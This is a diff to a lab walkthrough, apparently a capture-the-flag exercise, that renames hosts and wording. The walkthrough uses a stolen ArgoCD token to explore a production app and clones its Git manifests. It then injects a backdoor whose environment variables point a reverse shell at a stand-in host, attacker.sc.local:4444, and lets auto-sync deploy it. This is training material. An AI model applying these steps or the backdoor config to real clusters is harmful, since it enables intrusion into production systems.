@@ -72,7 +72,7 @@ export ARGOCD_AUTH_TOKEN='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhcmdvY
 # List applications using the token
 argocd app list \
   --auth-token="$ARGOCD_AUTH_TOKEN" \
-  --server localhost:30443 \
+  --server argocd.sc.local:31443 \
   --insecure \
   --grpc-web
 ```
@@ -93,13 +93,13 @@ Explore the current deployment to understand the attack surface.
 # Get application details using the stolen token
 argocd app get recipe-api-production \
   --auth-token="$ARGOCD_AUTH_TOKEN" \
-  --server localhost:30443 \
+  --server argocd.sc.local:31443 \
   --insecure \
   --grpc-web
 ```
 
 **Key observations**:
-- **Repo URL**: `http://gitea-http.gitea.svc.cluster.local:3000/ctf-admin/production-manifests.git`
+- **Repo URL**: `http://gitea-http.gitea.svc.cluster.local:3000/sc-admin/production-manifests.git`
 - **Path**: `recipe-api`
 - **Auto-sync enabled**: Changes to Git are automatically deployed!
 
@@ -111,21 +111,21 @@ As an attacker, you don't have direct kubectl access to the production cluster. 
 # Get application resource details via ArgoCD
 argocd app resources recipe-api-production \
   --auth-token="$ARGOCD_AUTH_TOKEN" \
-  --server localhost:30443 \
+  --server argocd.sc.local:31443 \
   --insecure \
   --grpc-web
 
 # Get detailed application manifest
 argocd app manifests recipe-api-production \
   --auth-token="$ARGOCD_AUTH_TOKEN" \
-  --server localhost:30443 \
+  --server argocd.sc.local:31443 \
   --insecure \
   --grpc-web
 ```
 
 ## Step 4: Choose Your Attack
 
-You have multiple attack options. We'll demonstrate **Attack A: Backdoor Injection** (recommended for CTF).
+You have multiple attack options. We'll demonstrate **Attack A: Backdoor Injection** (recommended for the deep dive).
 
 ### Attack Options
 
@@ -142,8 +142,8 @@ Modify the production deployment to inject a backdoor.
 ### 5.1 Clone the production-manifests Repository
 
 ```bash
-# Clone from production Gitea (port 30004, not the CTF cluster's 30002!)
-git clone http://localhost:30004/ctf-admin/production-manifests.git
+# Clone from production Gitea (port 30004, not the CI cluster's 30002!)
+git clone http://gitea-prod.sc.local:31080/sc-admin/production-manifests.git
 cd production-manifests/recipe-api
 ```
 
@@ -172,7 +172,7 @@ spec:
         - name: ENABLE_DEBUG_SHELL
           value: "true"
         - name: REVERSE_SHELL_HOST
-          value: "attacker.ctf.local"
+          value: "attacker.sc.local"
         - name: REVERSE_SHELL_PORT
           value: "4444"
         
@@ -210,7 +210,7 @@ ArgoCD is configured with `auto-sync`, so it will automatically detect the Git c
 # Watch the sync using the stolen token
 argocd app watch recipe-api-production \
   --auth-token="$ARGOCD_AUTH_TOKEN" \
-  --server localhost:30443 \
+  --server argocd.sc.local:31443 \
   --insecure \
   --grpc-web
 ```
@@ -228,21 +228,21 @@ Verify the malicious configuration was deployed via ArgoCD:
 # Check application sync status
 argocd app get recipe-api-production \
   --auth-token="$ARGOCD_AUTH_TOKEN" \
-  --server localhost:30443 \
+  --server argocd.sc.local:31443 \
   --insecure \
   --grpc-web
 
 # View the deployed manifests to confirm backdoor is present
 argocd app manifests recipe-api-production \
   --auth-token="$ARGOCD_AUTH_TOKEN" \
-  --server localhost:30443 \
+  --server argocd.sc.local:31443 \
   --insecure \
   --grpc-web | grep -A 5 "REVERSE_SHELL"
 ```
 
 **Expected output** should show the malicious environment variables and security context in the deployment manifest.
 
-## Step 7: Capture the Flag
+## Step 7: deep dive
 
 The flag for this challenge is embedded in the ArgoCD application:
 
@@ -250,7 +250,7 @@ The flag for this challenge is embedded in the ArgoCD application:
 # Get application details to find the flag
 argocd app get recipe-api-production \
   --auth-token="$ARGOCD_AUTH_TOKEN" \
-  --server localhost:30443 \
+  --server argocd.sc.local:31443 \
   --insecure \
   --grpc-web \
   -o yaml | grep -i flag
